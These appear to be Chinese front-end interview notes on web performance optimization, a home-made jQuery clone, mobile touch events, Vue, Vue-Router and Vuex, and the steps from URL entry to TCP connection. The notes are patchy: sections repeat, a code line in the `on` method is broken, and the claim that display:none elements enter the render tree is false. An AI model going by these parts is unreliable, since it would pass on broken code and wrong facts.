面经
含计网  数据库  操作系统 数据结构 require jQuery sass


1.性能优化篇
前端性能优化：
1.减少HTTP请求
基本原理：
在浏览器（客户端）和服务器发生通信时，就已经消耗了大量的时间，尤其是在网络情况比较糟糕的时候，这个问题尤其的突出。
一个正常HTTP请求的流程简述：如在浏览器中输入"www.xxxxxx.com"并按下回车，浏览器再与这个URL指向的服务器建立连接，然后浏览器才能向服务器发送请求信息，服务器在接受到请求的信息后再返回相应的信息，浏览器接收到来自服务器的应答信息后，对这些数据解释执行。
而当我们请求的网页文件中有很多图片、CSS、JS甚至音乐等信息时，将会频繁的与服务器建立连接，与释放连接，这必定会造成资源的浪费，且每个HTTP请求都会对服务器和浏览器产生性能负担。
网速相同的条件下，下载一个100KB的图片比下载两个50KB的图片要快。所以，请减少HTTP请求。
解决办法：
合并图片（css sprites精灵），合并CSS和JS文件；图片较多的页面也可以使用 lazyLoad 等技术进行优化。
9.压缩图片和使用图片Spirit技术
基本原理：
注：其实压缩图片和图片精灵是两个方面的技术，可是既然都是关于图片的优化还是放到一块吧。
现在由于工作的细分，专业的前端工程师已经少有机会去切图了，可是关于图片压缩还是得略微了解，一般图片压缩的方式有：
1.缩小图片分辨率；
2.改变图片格式；
3.降低图片保存质量。
关于图片精灵（Spirit）技术就和我们工作直接相关，不管是在CSS中的图片还是在HTML结构中的图片都会产生HTTP请求，前端优化的第一条就是减少请求数，最直接有效的方法是使用图片精灵（CSS Spirit）。图片精灵就是把许多图片放到一张大图片里面，通过CSS来显示图片的一部分。
至于图片精灵的操作细节就不多做介绍了，网上相关内容很多。
3.请减少对DOM的操作
基本原理：
对DOM操作的代价是高昂的，这在网页应用中的通常是一个性能瓶颈。
天生就慢。在《高性能JavaScript》中这么比喻："把DOM看成一个岛屿，把JavaScript（ECMAScript）看成另一个岛屿，两者之间以一座收费桥连接"。所以每次访问DOM都会教一个过桥费，而访问的次数越多，交的费用也就越多。所以一般建议尽量减少过桥次数。
解决办法：
修改和访问DOM元素会造成页面的Repaint和Reflow，循环对DOM操作更是罪恶的行为。所以请合理的使用JavaScript变量储存内容，考虑大量DOM元素中循环的性能开销，在循环结束时一次性写入。
减少对DOM元素的查询和修改，查询时可将其赋值给局部变量。
注：在IE中：hover会降低响应速度。
观可读性强的代码。如果你是纯粹的前台开发人员，一定会非常喜欢JSON。
7.将CSS和JS放到外部文件中引用，CSS放头，JS放尾
放在下面避免影响网页加载
基本原理：
注：这个是很基础且必须遵循的知识点，引入外部文件好处是显而易见的，而且是项目稍稍复杂一点的时候就有必要了这样做了。
易维护、易扩展，方便管理和重复利用。
正确的方式：
JavaScript是浏览器中的霸主，为什么这么说，因为在浏览器在执行JavaScript代码时，不能同时做其它事情，即《script》每次出现都会让页面等待脚本的解析和执行（不论JavaScript是内嵌的还是外链的），JavaScript代码执行完成后，才继续渲染页面。这个也就是JavaScript的阻塞特性。
因为这个阻塞的特点，建议把JavaScript代码放到《/body》标签以前，这样既能有效的防止JavaScript的阻塞，又能使得页面的HTML结构能更快的释放。
HTML规范清楚指出CSS要放包含在页面的《head》区域内，这里就不多解释了。
12.适当使用图片预加载和懒加载
懒加载：当页面被请求时，只加载可视区域的图片，其它部分的图片则不加载，只有这些图片出现在可视区域时才会动态加载这些图片
如何判断是否出现在可视区域内吗？ 那就是你可以获取当前img的相对于文档顶的偏移距离减去scrollTop的距离， 然后和浏览器窗口高度在进行比较，如果小于浏览器窗口则出现在了可视区域内了， 反之，则没有。
预加载：用不用都加载，轮播图的时候先把所有图片都加载出来，可以让用户有更好的体验。

2.请正确理解 Repaint 和 Reflow
注：Repaint 和 Reflow 也就是重绘和重排，
基本原理：
Repaint（重绘）就是在一个元素的外观被改变，但没有改变布局（宽高）的情况下发生，如改变visibility、outline、背景色等等。
Reflow（重排）就是DOM的变化影响到了元素的几何属性（宽和高），浏览器会重新计算元素的几何属性，会使渲染树中受到影响的部分失效，浏览器会验证DOM树上的所有其它结点的visibility属性，这也是Reflow低效的原因。如：改变窗囗大小、改变文字大小、内容的改变、浏览器窗口变化，style属性的改变等等。如果Reflow的过于频繁，CPU使用率就会上涨，所以前端也就有必要知道 Repaint 和 Reflow的知识。
减少性能影响的办法：
上面提到通过设置style属性改变结点样式的话，每设置一次都会导致一次reflow，所以最好通过设置class的方式；　有动画效果的元素，它的position属性应当设为fixed或absolute，这样不会影响其它元素的布局；如果功能需求上不能设置position为fixed或absolute，那么就权衡速度的平滑性。
重排一定会导致重绘，重绘不一定会重排，重排对性能影响更大。
总之，因为 Reflow 有时确实不可避免，所以只能尽可能限制Reflow的影响范围。
浏览器会先创建DOM树，根据CSS规则（解析CSS规则树）创建渲染树，display=none会出现在渲染树当中。
5.高效使用HTML标签和CSS样式

当页面被触发引起回流（reflow）的时候，低效的选择符依然会引发更高的开销，所以请避免低效。
6.使用CDN加速（内容分发网络）
基本原理：
CDN的全称是Content Delivery Network，即内容分发网络。
"其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。"
不足之处：
实时性不太好是CDN的致命缺陷。随着对CDN需求的逐渐升温，这一缺陷将得到改进，使来自于远程服务器的网络内容网页与复本服务器或缓存器中的网页保持同步。解决方法是在网络内容发生变化时将新的网络内容从服务器端直接传送到缓存器，或者当对网络内容的访问增加时将数据源服务器的网络内容尽可能实时地复制到缓存服务器。
8.精简CSS和JS文件
基本原理：
有一条非常重要的准则一直没有提到，就是CSS和JavaScript的压缩，直接减少下载的文件体积。我个人经常使用的方式是使用 YUI Compressor，它的特点是：移除注释；移除额外的空格；细微优化；标识符替换。
YUI Compressor是java程序，如果你对java很熟悉的话可快速的上手使用yuicompressor.jar；如果你对java很陌生也没关系，一样可以使用YUI Compressor，下面介绍其使用方式。
YUI Compressor的配置和使用：
先配置使用环境：
1.先确保电脑中是否安装了JDK
2.再配置必要的环境变量（细节不能三两句说清，所以不知道如何设置还是搜索吧）
3.在cmd界面，输入javac可测试是否安装成功
使用方法可从cmd到进入yuicompressor.jar所在磁盘，我以自己的yuicompressor-2.4.2.jar为例：
1.压缩JS
java -jar yuicompressor-2.4.2.jar api.js > api.min.js
2.压缩CSS
java -jar yuicompressor-2.4.2.jar style.css > style.min.css

当然，还有另一种更傻瓜式的使用方式，赶兴趣的朋友自己可去多尝试下。
10.注意控制Cookie大小和污染
基本原理和使用方法：
有关Cookie的基础和高级知识可以去看本人写过的一篇文章《JavaScript 操作 Cookie》。
因为Cookie是本地的磁盘文件，每次浏览器都会去读取相应的Cookie，所以建议去除不必要的Coockie，使Coockie体积尽量小以减少对用户响应的影响；
使用Cookie跨域操作时注意在适应级别的域名上设置coockie以便使子域名不受其影响
Cookie是有生命周期的，所以请注意设置合理的过期时间，合理地Expire时间和不要过早去清除coockie，都会改善用户的响应时间。


11．避免重定向
曾经有的资源，原来的地址被转移到了新的地址，如果不重定向，会404找不到，php里面header，location（具体的），重定向发送两次请求，
301永久重定向，302临时重定向，先去别的服务器下面进行配置，然后还能回到原来的地址。
13.适当的使用CSS3动画代替传统的定位
CSS3动画会开启GPU加速
利用事件委托为相同的子元素事件绑定，委托给父元素
2.JS仿写JQ


// 35\jq原理
//     jq最核心的是$,他是一个函数.函数中返回一个自定义的jq对象,她是一个类,在这个类的原形下有许多jq自定义的方法.每次调用$返回一个新的jq对象,同时在$函数中根据传入参数的类型,函数或者字符串.
//     把选中的元素存在数组中,遍历这个数组,取出每个元素进行dom操作.
//     在每一个方法中,return this,this就是在$函数中返回的jq对象..
function getStyle(elem, prop) {//样式
    if (elem.currentStyle) {
        return elem.currentStyle[prop];
    } else if (getComputedStyle) {
        return getComputedStyle(elem, false)[prop];
    } else {
        return elem.style[prop];
    }
}

function addEvent(elem, type, handler) {//事件
    if (elem.addEventListener) {
        elem.addEventListener(type, handler, false);
    } else if (elem.attachEvent) {
        elem.attachEvent('on' + type, handler)
    } else {
        elem['on' + type] = handler;
    }
}


function $(args) {
    return new MyJQuery(args);
}

function MyJQuery(args) {
    this.elements = [];
    switch (typeof args) {//判断传值类型
        case 'function':
            addEvent(window, 'load', args);
            break;
        case 'string':
            var firstLetter = args.charAt(0);
            switch (firstLetter) {
                case '#'://#xxx
                    this.elements.push(document.getElementById(args.substring(1)));
                    break;
                case '.':
                    this.elements = document.getElementsByClassName(args.substring(1));
                    break;
                default:
                    this.elements = document.getElementsByTagName(args);
            }
            break;
        case 'object':
            this.elements.push(args);
            break;
    }
}

MyJQuery.prototype.addClass = function (clsName) {
    for (var i = 0; i < this.elements.length; i++) {
        var re = new RegExp('\\b' + clsName + '\\b', 'g');//边界,取出原来的classname
        if (!re.test(this.elements[i].className)) {
            this.elements[i].className += ' ' + clsName;
            this.elements[i].className = MyJQuery.trim(this.elements[i].className);//去空格
        }
    }
    return this;
};

MyJQuery.prototype.width = function (length) {
    if (length) {
        for (var i = 0; i < this.elements.length; i++) {
            this.elements[i].style.width = length + 'px';
        }
        return this;
    }
    return getStyle(this.elements[0], 'width');

};

MyJQuery.prototype.click = function (fn) {
    for (var i = 0; i < this.elements.length; i++) {
        addEvent(this.elements[i], 'click', fn);
    }
    return this;
};

MyJQuery.prototype.on = function (type, selector, fn) {,click,'.l',function(){}
    if (typeof selector == 'string') {
        for(var i=0; i<this.elements.length; i++){
            addEvent(this.elements[i], type, function (e) {
                e = e || window.event;
                var target = e.target || e.srcElement;
                switch (selector.charAt(0)){
                    case '#':
                        break;
                    case '.':
                        if(target.className == selector.substr(1)){
                            fn.apply(target);//改变this指向,指向真实绑定的元素
                        }
                        break;
                    default:
                        break;
                }
            });
        }
    } else {
        for (var i = 0; i < this.elements.length; i++) {
            addEvent(this.elements[i], type, fn);
        }
    }
    return this;
};

MyJQuery.prototype.siblings = function (selector) {
    var result = [];
    for (var i = 0; i < this.elements.length; i++) {
        var childs = this.elements[i].parentNode.children;
        for(var j=0; j<childs.length; j++){
            switch (selector.charAt(0)){
                case '#':
                    break;
                case '.':
                    if(childs[j].className == selector.substr(1)){
                        if(childs[j] != this.elements[i] && result.indexOf(childs[j]) == -1){
                            result.push(childs[j]);
                        }
                    }
                    break;
                default:
                    break;
            }

        }
    }
    return result;
};

MyJQuery.prototype.css = function (prop, value) {
    if(value){
        for (var i = 0; i < this.elements.length; i++) {
            this.elements[i].style[prop] = value;
        }
    } else {
        if (typeof prop == 'string'){
           return getStyle(this.elements[0], prop);
        }else if(typeof prop == 'object'){
            for(var p in prop){
                //p:background-color=>backgroundColor
                p = p.replace(/\-[a-z]/g, function (word) {
                    return word.substring(1).toUpperCase();
                });
                for (var i = 0; i < this.elements.length; i++) {
                    this.elements[i].style[p] = prop[p];
                }
            }
        }
    }
};

MyJQuery.trim = function (str) {
    var re = /^\s+|\s+$/g; // _abc_
    return str.replace(re, '');
};
3.移动端事件
一、click 和 tap 比较

两者都会在点击时触发，但是在手机WEB端，click会有 200~300 ms，所以请用tap代替click作为点击事件。

singleTap和doubleTap 分别代表单次点击和双次点击。



点透现象出现的场景:
当A/B两个层上下z轴重叠，上层的A点击后消失或移开（这一点很重要），并且B元素本身有默认click事件（如a标签）或绑定了click事件。在这种情况下，点击A/B重叠的部分，就会出现点透的现象。
点透现象出现的原因：
zepto的tap事件是通过兼听绑定在document上的touch事件来完成tap事件的模拟的，并且tap事件是冒泡到document上触发的！

二、关于tap的点透处理

在使用zepto框架的tap来移动设备浏览器内的点击事件，来规避click事件的延迟响应时，有可能出现点透的情况，即点击会触发非当前层的点击事件。


然后给需要“无延迟点击”的元素绑定click事件（注意不再是绑定zepto的tap事件）即可。
当然，你也可以不在body上初始化它，而在某个dom上初始化，这样，只有这个dom和它的子元素才能享受“无延迟”的点击

实践开发中发现，当元素绑定fastclick后，click响应速度比tap还要快一点点。哈哈

（2）、为元素绑定touchend事件，并在内部加上e.preventDefault();

$demo.on('touchend',function(e){
//
 改变了事件名称，tap是在body上才被触发，而touchend是原生的事件，在dom本身上就会被捕获触发

    $demo.hide()

    e.preventDefault();
//
 阻止“默认行为”

})

三、touch事件touch是针对触屏手机上的触摸事件。现今大多数触屏手机webkit内核提供了touch事件的监听，让开发者可以获取用户触摸屏幕时的一些信息。


其中包括：touchstart,touchmove,touchend,touchcancel 这四个事件

touchstart,touchmove,touchend事件可以类比于mousedown，mouseover
 ，mouseup的触发。

touchstart
 ： 当手指触摸到屏幕会触发；


touchmove
 : 当手指在屏幕上移动时，会触发；


touchend
 : 当手指离开屏幕时，会触发；


而touchcancel许多人不知道它在什么时候会被触发而忽略它，其实当你的手指还没有离开屏幕时，有系统级的操作发生时就会触发touchcancel，例如alert和confirm弹框，又或者是Android系统的功能弹窗。


例如：

这4个事件的触发顺序为：

touchstart -> touchmove -> …… -> touchmove ->touchend

但是单凭监听上面的单个事件，不足以满足我们去完成监听在触屏手机常见的一些手势操作，如双击、长按、左右滑动、缩放等手势操作。需要组合监听这些事件去封装对这类手势动作。

其实市面上很多框架都针对手机浏览器封装了这些手势，例如jqmobile、zepto、jqtouch，不过悲剧发生了，对于某些android系统（我自己测试到的在android 4.0.x），touchmove和touchend事件不能被很好的触发，举例子说明下：

比如手指在屏幕由上向下拖动页面时，理论上是会触发 一个 touchstart ，很多次 touchmove ，和最终的 touchend ，可是在android 4.0上，touchmove只被触发一次，触发时间和touchstart 差不多，而touchend直接没有被触发。这是一个非常严重的bug，在google Issue已有不少人提出  http://code.google.com/p/android/issues/detail?id=19827

暂时我只发现在android 4.0会有这个bug，据说 iOS 3.x的版本也会有。

而显然jqmobile、zepto等都没有意识到这个bug对监听实现带来的严重影响，所以在直接使用这些框架的event时，或多或少会出现兼容性问题！（个人亲身惨痛经历）

<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"/>

5.VUE概述

Vue.js是JavaScript MVVM（Model-View-ViewModel）库，十分简洁，

Vue核心只关注视图层，

相对AngularJS提供更加简洁、易于理解的API。

Vue尽可能通过简单的API实现响应的数据绑定和组合的视图组件。

MVVM模式即Model-View-ViewModel。


Vue是以数据为驱动的，Vue自身将DOM和数据进行绑定，一旦创建绑定，DOM和数据将保持同步，每当数据发生变化，DOM会跟着变化。
ViewModel是Vue的核心，它是Vue的一个实例。Vue实例时作用域某个HTML元素上的，这个HTML元素可以是body，也可以是某个id所指代的元素。


原理：
把一个普通对象传给 Vue 实例作为它的 data 选项，Vue.js 将遍历它的属性，用 Object.defineProperty 将它们转为 getter/setter。这是 ES5 特性，不能打补丁实现，这便是为什么 Vue.js 不支持 IE8 及更低版本。


Vue.js特点
简洁：页面由HTML模板+Json数据+Vue实例组成
数据驱动：自动计算属性和追踪依赖的模板表达式
组件化：用可复用、解耦的组件来构造页面
轻量：代码量小，不依赖其他库
快速：精确有效批量DOM更新
模板友好：可通过npm，bower等多种方式安装，很容易融入


声明式渲染
由HTML模板（View）+Json数据（Model）+Vue实例（ViewModel）组成。
创建Vue的实例，需传入一个选项对象，如：数据、挂载元素、方法、模生命周期钩子等。

双向绑定
在Vue中使用v-model在表单元素上实现双向绑定。当在输入框输入的信息发生变化，<p>...</p>中的信息随之变化；当通过控制台中的Console，修改exampleData.message的值，输入框中的信息也随之变化。

什么叫做虚拟dom:
	用JS对象表示DOM结构,当数据发生改变时.跟原来的dom树进行对比.通过在这个虚拟DOM上实现了一个diff算法找出最小变更，再把这些变更写入实际的DOM中。

虚拟dom具体如何实现?
	1>如何比较两个两棵DOM树
		我们很少跨级别的修改DOM节点，通常是修改节点的属性、调整子节点的顺序、添加子节点等。因此，我们只需要对同级别节点进行比较，避免了diff算法的复杂性。

		对同级别节点进行比较的常用方法是深度优先遍历//

			深度优先遍历:也就深入的遍历，沿着每一个分支直到走到最后，然后才返回来遍历剩余的节点
		function diff(oldTree, newTree) {
		    //节点的遍历顺序
		    var index = 0;
		    //在遍历过程中记录节点的差异
		    var patches = {};
		    //深度优先遍历两棵树
		    dfsWalk(oldTree, newTree, index, patches);
		    return patches;
		}

	2>如何记录节点之间的差异
		由于我们对DOM树采取的是同级比较，因此节点之间的差异可以归结为4种类型：
			修改节点属性, 用PROPS表示
			修改节点文本内容, 用TEXT表示
			替换原有节点, 用REPLACE表示
			调整子节点，包括移动、删除等，用REORDER表示
		而当旧节点的属性被修改时：{type:PROPS,props: newProps}

		在深度优先遍历的过程中，每个节点都有一个编号，如果对应的节点有变化，只需要把相应变化的类别记录下来即可。

		比如对上文图中的两颗虚拟DOM树，可以用如下数据结构记录它们之间的变化：

		var patches = {
		        1:{type:REPLACE,node:newNode}, //h1节点变成h5
		        5:{type:REORDER,moves:changObj} //ul新增了子节点li
		    }


	3>对真实DOM进行最小化修改
		通过虚拟DOM计算出两颗真实DOM树之间的差异后，我们就可以修改真实的DOM结构了。上文深度优先遍历过程产生了用于记录两棵树之间差异的数据结构patches, 通过使用patches我们可以方便对真实DOM做最小化的修改。



MVVM MVC MVP区别
	MVVM:将“数据模型数据双向绑定”的思想作为核心，因此在View和Model之间没有联系，通过ViewModel进行交互，而且Model和ViewModel之间的交互是双向的，因此视图的数据的变化会同时修改数据源，而数据源数据的变化也会立即反应到View上。

	MVC是比较直观的架构模式，用户操作->View（负责接收用户的输入操作）->Controller（业务逻辑处理）->Model（数据持久化）->View（将结果反馈给View）。

	MVP:MVP是把MVC中的Controller换成了Presenter（呈现），目的就是为了完全切断View跟Model之间的联系，由Presenter充当桥梁，做到View-Model之间通信的完全隔离。


子组件通过$emit触发父组件的事件，$emit后面的参数是向父组件传参，注意，父组件的事件处理函数直接写函数名即可，不要加(),参数直接传递到了父组件的methods的事件处理函数了。
再说一个非常方便的v-ref事件



Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。Vuex 也集成到 Vue 的官方调试工具 devtools extension，提供了诸如零配置的 time-travel 调试、状态快照导入导出等高级调试功能。

这个状态自管理应用包含以下几个部分：

state，驱动应用的数据源；
view，以声明方式将state映射到视图；
actions，响应在view上的用户输入导致的状态变化。但是，当我们的应用遇到多个组件共享状态时，单向数据流的简洁性很容易被破坏：

多个视图依赖于同一状态。
来自不同视图的行为需要变更同一状态。
对于问题一，传参的方法对于多层嵌套的组件将会非常繁琐，并且对于兄弟组件间的状态传递无能为力。对于问题二，我们经常会采用父子组件直接引用或者通过事件来变更和同步状态的多份拷贝。以上的这些模式非常脆弱，通常会导致无法维护的代码。

因此，我们为什么不把组件的共享状态抽取出来，以一个全局单例模式管理呢？在这种模式下，我们的组件树构成了一个巨大的“视图”，不管在树的哪个位置，任何组件都能获取状态或者触发行为！

另外，通过定义和隔离状态管理中的各种概念并强制遵守一定的规则，我们的代码将会变得更结构化且易维护。

这就是 Vuex 背后的基本思想，借鉴了 Flux、Redux、和 The Elm Architecture。与其他模式不同的是，Vuex 是专门为 Vue.js 设计的状态管理库，以利用 Vue.js 的细粒度数据响应机制来进行高效的状态更新

router

1.定义组件，这里使用从其他文件import进来
import index from './components/index.vue'
import hello from './components/hello.vue'
2.定义路由
const routes = [
    { path: '/index', component: index },
    { path: '/hello', component: hello },
]
3.创建 router 实例，然后传 routes 配置
const router = new VueRouter({
  routes
})
4.创建和挂载根实例。通过 router 配置参数注入路由，从而让整个应用都有路由功能
const app = new Vue({
    router,
    render: h => h(App)
}).$mount('#app')
经过上面的配置之后呢，路由匹配到的组件将会渲染到App.vue里的<router-view></router-view>
那么这个App.vue里应该这样写：
<template>
  <div id="app">
        <router-view></router-view>
  </div>
</template>
index.html里呢要这样写：
<body>
    <div id="app"></div>
</body>
这样就会把渲染出来的页面挂载到这个id为app的div里了

子组件通过props来接收数据:
子组件通过$emit触发父组件的事件，$emit后面的参数是向父组件传参，注意，父组件的事件处理函数直接写函数名即可，不要加(),参数直接传递到了父组件的methods的事件处理函数了。

6.VUE钩子生命周期
vue1.0         vue2.0           description

init           beforeCreate     组件实例刚被创建，组件属性计算之前
created        created			组件实例创建完成，属性已绑定，但dom还未生成，$el属性还不存在
beforeCompile  beforeMount		模版编译/挂载之前
compiled	   mounted			模版编译/挂载之后
ready          mounted			模版编译/挂载之后（不保证组件已在document中）
			   beforeUpdate     组件更新之前
			   updated          组件更新之后
			   activated        for keep-alive，组件被激活时调用
			   deactivated      for keep-alive，组件被移除时调用
attached
datached
beforeDestory  beforeDestory    组件销毁前调用
destoryed      destoryed        组件销毁后调用
7.VUE-Router
1.定义组件，这里使用从其他文件import进来
import index from './components/index.vue'
import hello from './components/hello.vue'
2.定义路由
const routes = [
    { path: '/index', component: index },
    { path: '/hello', component: hello },
]
3.创建 router 实例，然后传 routes 配置
const router = new VueRouter({
  routes
})
4.创建和挂载根实例。通过 router 配置参数注入路由，从而让整个应用都有路由功能
const app = new Vue({
    router,
    render: h => h(App)
}).$mount('#app')
经过上面的配置之后呢，路由匹配到的组件将会渲染到App.vue里的<router-view></router-view>
那么这个App.vue里应该这样写：
<template>
  <div id="app">
        <router-view></router-view>
  </div>
</template>
index.html里呢要这样写：
<body>
    <div id="app"></div>
</body>
这样就会把渲染出来的页面挂载到这个id为app的div里了。
二、重定向 redirect
const routes = [
    { path: '/', redirect: '/index'},     // 这样进/ 就会跳转到/index
    { path: '/index', component: index }
]
三、嵌套路由
const routes = [
    { path: '/index', component: index,
        children: [
            { path: 'info', component: info}
        ]
     }
]
通过/index/info就可以访问到info组件了
四、懒加载
const routes = [
    { path: '/index', component: resolve => require(['./index.vue'], resolve) },
    { path: '/hello', component: resolve => require(['./hello.vue'], resolve) },
]
通过懒加载就不会一次性把所有组件都加载进来，而是当你访问到那个组件的时候才会加载那一个。对于组件比较多的应用会提高首次加载速度。
五、<router-link>
在vue-router 1中，使用的是
在vue-router 2中，使用了<router-link></router-link>替换1版本中的a标签
<!-- 字符串 -->
<router-link to="home">Home</router-link>
<!-- 渲染结果 -->
<a href="home">Home</a>

<!-- 使用 v-bind 的 JS 表达式 -->
<router-link v-bind:to="'home'">Home</router-link>

<!-- 不写 v-bind 也可以，就像绑定别的属性一样 -->
<router-link :to="'home'">Home</router-link>

<!-- 同上 -->
<router-link :to="{ path: 'home' }">Home</router-link>

<!-- 命名的路由 -->
<router-link :to="{ name: 'user', params: { userId: 123 }}">User</router-link>

<!-- 带查询参数，下面的结果为 /register?plan=private -->
<router-link :to="{ path: 'register', query: { plan: 'private' }}">Register</router-link>
六、路由信息对象
1.$route.path
字符串，对应当前路由的路径，总是解析为绝对路径，如 "/foo/bar"。
2.$route.params
一个 key/value 对象，包含了 动态片段 和 全匹配片段，如果没有路由参数，就是一个空对象。
3.$route.query
一个 key/value 对象，表示 URL 查询参数。例如，对于路径 /foo?user=1，则有 $route.query.user == 1，如果没有查询参数，则是个空对象。
4.$route.hash
当前路由的 hash 值 (不带 #) ，如果没有 hash 值，则为空字符串。
5.$route.fullPath
完成解析后的 URL，包含查询参数和 hash 的完整路径。
6.$route.matched
一个数组，包含当前路由的所有嵌套路径片段的 路由记录 。路由记录就是 routes 配置数组中的对象副本（还有在 children 数组）。
综合上述，一个包含重定向、嵌套路由、懒加载的main.js如下：
import Vue from 'vue'
import VueRouter from 'vue-router'
import App from './App'
Vue.use(VueRouter)
const router = new VueRouter({
  routes:[
    { path: '/', redirect: '/index' },
    { path: '/index', component: resolve => require(['./components/index.vue'], resolve),
        children:[
            { path: 'info', component: resolve => require(['./components/info.vue'], resolve) }
       ]
    },
    { path: '/hello', component: resolve => require(['./components/hello.vue'], resolve) },
  ]
})
const app = new Vue({
  router,
  render: h => h(App)
}).$mount('#app')
8.Vue组件传值与VUEX
子组件通过props来接收数据:
子组件通过$emit触发父组件的事件，$emit后面的参数是向父组件传参，注意，父组件的事件处理函数直接写函数名即可，不要加(),参数直接传递到了父组件的methods的事件处理函数了。
再说一个非常方便的v-ref事件



Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。Vuex 也集成到 Vue 的官方调试工具 devtools extension，提供了诸如零配置的 time-travel 调试、状态快照导入导出等高级调试功能。

这个状态自管理应用包含以下几个部分：

state，驱动应用的数据源；
view，以声明方式将state映射到视图；
actions，响应在view上的用户输入导致的状态变化。但是，当我们的应用遇到多个组件共享状态时，单向数据流的简洁性很容易被破坏：

多个视图依赖于同一状态。
来自不同视图的行为需要变更同一状态。
对于问题一，传参的方法对于多层嵌套的组件将会非常繁琐，并且对于兄弟组件间的状态传递无能为力。对于问题二，我们经常会采用父子组件直接引用或者通过事件来变更和同步状态的多份拷贝。以上的这些模式非常脆弱，通常会导致无法维护的代码。

因此，我们为什么不把组件的共享状态抽取出来，以一个全局单例模式管理呢？在这种模式下，我们的组件树构成了一个巨大的“视图”，不管在树的哪个位置，任何组件都能获取状态或者触发行为！

另外，通过定义和隔离状态管理中的各种概念并强制遵守一定的规则，我们的代码将会变得更结构化且易维护。

这就是 Vuex 背后的基本思想，借鉴了 Flux、Redux、和 The Elm Architecture。与其他模式不同的是，Vuex 是专门为 Vue.js 设计的状态管理库，以利用 Vue.js 的细粒度数据响应机制来进行高效的状态更新
9.vue常用指令
Vue.js常用指令
Vue指令以v-开头，作用在HTML元素上，将指令绑定在元素上时，会给绑定的元素添加一些特殊行为，可将指令视作特殊的HTML属性（attribute）。
下面将介绍Vue中常用的几个内置指令。当然，Vue除了内置指令，也可以根据需求自定义指令。

v-if指令
条件判断指令，根据表达式值的真假来插入或删除元素，表达式返回一个布尔值，语法如下：
v-if = "expression"

v-show指令
条件渲染指令，与v-if不同的是，无论v-show的值为true或false，元素都会存在于HTML代码中；而只有当v-if的值为true，元素才会存在于HTML代码中。v-show指令只是设置了元素CSS的style值。语法如下：
v-show = "expression"

v-else指令
可配合v-if或v-show使用，v-else指令必须紧邻v-if或v-show，否则该命令无法正常工作。v-else绑定的元素能否渲染在HTML中，取决于前面使用的是v-if还是v-show。若前面使用的是v-if，且v-if值为true，则v-else元素不会渲染；若前面使用的是v-show，且v-show值为true，则v-else元素仍会渲染到HTML。

v-for指令
循环指令，基于一个数组渲染一个列表，与JavaScript遍历类似，语法如下：
v-for = "item in items;"

v-bind指令
给DOM绑定元素属性，语法如下：
v-bind:argument="expression"
其中，argument通常是HTML元素的特性，如：v-bind:class="expression"。
注：v-bind指令可以缩写为:冒号。如：:class="expression"。
10.新浪面经
优化：
 1.代码层面的优化
	 1。提高JS代码复用性，缩小JS文件大小。
	 2。减少DOM选择和计算，dom操作，变量操作的结果缓存，下次直接使用缓存结果
	 3。CSS文件优化，正确使用display属性，否则会影响页面的渲染；不滥用float；不申明过多的fontsize；标准化各种浏览器的前缀；避免使用高级的选择器，耗时长，尽量使用id，class选择器，避免使用内联style；尽量使用css3动画
	 4。资源加载，按需加载和异步加载；
	 5。压缩所有的html css js
	 6。减少重绘和回流；
	 7使用touchstart，touchend click；
	 8html中使用viewport；
	 9。touchmove scroll事件会导致多次渲染；
	 10。避免空的src 减少html中的src请求

2框架级优化
	使用第三方资源时，由于资源不可控，所以要慎选择。要根据项目需求和其对比性的影响去综合考虑，选择合适的框架以及库文件，同时使用异步加载的方式去加载，避免第三方资源的使用影响项目本身的性能。

3域名\服务端的优化
	1.使用压缩资源；
	2.资源缓存，合理设置资源的过期时间；
	3.减少cookies，减少cookies头信息的大小，否则会影响传输速度；
	4.CDN加速，图片或者css，js均可以使用cdn来加速。

4服务器端优化
	1.接口合并，如果一个页面需要请求两部分以上的数据接口，则建议合并成一个，可以减少http请求；
	2.减少数据量，去掉接口返回的数据中不需要的数据；
	3.缓存数据，首次加载请求一次后，缓存下数据；非首次请求优先使用上次请求的数据，可以提高非首次请求的加载速度

移动端一般遵循1秒法则或者3秒法则
4G/wifi下，1s完成页面加载，包括首屏资源可看可用
3G下，1秒完成首包的返回
2G下，1秒完成建立连接
DNS优化：建立白名单域名
连接复用，开启spdy http2 域名控制，例如静态资源都放在一个域名下，图片优化，图片根据网络情况和设备的分辨率做适配。合并请求，保证组件都小于25K，组件打包到一个符合文档里 常见的前端性能优化此处也使用，比如雅虎的35条军规。
内容方面：减少http请求，例如合并文件 css sprites 行内图片；
减少DNS查询，避免重定向 ajax可缓存，延迟加载组件
css部分：避免使用CSS表达式，使用link 避免import 样式表放在顶部 压缩CSS
JS部分 去除重复脚本 减少DOM访问，脚本放在页面最下方 压缩JS
服务器 开启GZIP 避免图片SRC属性为空，配置Etags 使用CDN

网址输入url回车之后发生了什么
	当在浏览器中输入URL后，浏览器首先对拿到的URL进行识别，抽取出域名字段。

	在进行DNS解析时，会经历以下步骤：

		查询浏览器缓存（浏览器会缓存之前拿到的DNS 2-30分钟时间），如果没有找到，

		检查系统缓存，检查hosts文件，这个文件保存了一些以前访问过的网站的域名和IP的数据。它就像是一个本地的数据库。如果找到就可以直接获取目标主机的IP地址了。没有找到的话，需要

		检查路由器缓存，路由器有自己的DNS缓存，可能就包括了这在查询的内容；如果没有，要

		查询ISP DNS 缓存：ISP服务商DNS缓存（本地服务器缓存）那里可能有相关的内容，如果还不行的话，需要，

		递归查询：从根域名服务器到顶级域名服务器再到极限域名服务器依次搜索哦对应目标域名的IP。

		3. 浏览器与网站建立TCP连接（三次握手）

第一次握手：客户端向服务器端发送请求（SYN=1） 等待服务器确认；

第二次握手：服务器收到请求并确认，回复一个指令（SYN=1，ACK=1）；

第三次握手：客户端收到服务器的回复指令并返回确认（ACK=1）。

4.请求和传输数据

比如要通过get请求访问“http://www.dydh.org/”，通过抓包可以看到：

